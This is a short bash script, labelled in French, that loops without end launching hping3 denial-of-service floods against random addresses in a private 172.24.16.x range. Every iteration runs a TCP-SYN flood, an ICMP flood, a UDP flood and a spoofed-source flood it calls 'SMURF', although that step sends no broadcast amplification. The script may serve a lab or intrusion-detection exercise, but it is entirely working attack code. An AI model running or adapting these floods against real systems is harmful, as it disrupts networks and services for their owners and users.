#!/bin/bash

iterations=10  # Nombre d'itérations

while true; do
    for ((i = 0; i < $iterations; i++)); do
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo "*    $((i + 1))    *          Itération num : $((i + 1))        *   $((i + 1))         *"
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"

        dst_ip=$(python3 - <<END
import random

def ip_generator():
    ip = ".".join(["172", "24", "16", str(random.randint(1, 19))])
    return ip

print(ip_generator())
END
)



        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo -e "              Exécution d'une inondation TCP-SYN               "
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"

        timeout 5s hping3 -S -V -d 120 -w 64 -p 80 --flood "$dst_ip"
        sleep 5

        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo -e "              Exécution d'une inondation SMURF               "
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"

        timeout 5s hping3 -1 -V -d 120 -w 64 -p 80 --rand-source -a "$dst_ip" "$dst_ip"
        sleep 5

        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo -e "              Exécution d'une inondation ICMP               \n"
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"

        timeout 5s hping3 -1 -V -d 120 -w 64 -p 80 --flood "$dst_ip"
        sleep 5

        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo -e "              Exécution d'une inondation UDP               \n"
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"

        timeout 5s hping3 -2 -V -d 120 -w 64 -p 80 --flood "$dst_ip"
        sleep 5
    done
done
